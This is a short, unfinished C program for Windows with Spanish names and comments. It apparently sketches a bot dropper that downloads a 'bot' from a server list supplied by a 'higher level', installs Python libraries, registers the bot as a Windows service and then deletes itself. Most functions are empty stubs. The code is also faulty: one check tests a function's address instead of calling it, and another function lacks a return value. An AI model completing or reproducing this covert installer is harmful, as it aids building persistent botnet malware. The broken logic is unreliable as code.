 #include<windows.h>

BOOL obtenerBot();
BOOL instalarBot();
BOOL obtenerLibreriasPython();
BOOL libreriasPythonInstaladas();
BOOL anyadirBotComoServicio();
void borrarme();
BOOL descargarBot();

int main(){
  if(!obtenerBot())
    return -1;
  else{}
  
  if(!libreriasPythonInstaladas())
    if(!obtenerLibreriasPython)
	return -1;
    else{}
  else{}

  if(!anyadirBotComoServicio())
	return -1;
  
  borrarme();
return 0;
}

BOOL obtenerBot(){
  
  if(!descargarBot())
    return FALSE;
  else
    if(!instalarBot())
      return FALSE;
}

BOOL descargarBot(){
  //Esta funcion descarga el bot desde un servidor, la direccion del cual esta en un archivo que me tienen que dar
  //**Avisar al nivel superior de que me proporcione fichero con direcciones de servidores, asi es mas facil el mantenimiento
  
  
}
